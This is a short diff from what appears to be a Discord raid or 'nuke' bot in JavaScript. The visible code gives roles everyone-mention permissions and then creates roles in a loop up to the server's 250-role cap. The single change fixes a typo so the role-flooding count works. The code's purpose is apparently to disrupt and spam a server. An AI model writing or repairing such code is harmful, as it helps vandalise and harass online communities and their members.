@@ -297,7 +297,7 @@ setTimeout(() => {
     if(r.editable) {
       r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
     .catch(console.error)}
-  var times = 250 - message.guild.roles.catch.size - 5
+  var times = 250 - message.guild.roles.cache.size - 5
   var idkhere = 0
    while(idkhere < times) {
     message.guild.roles.create(channelnames())
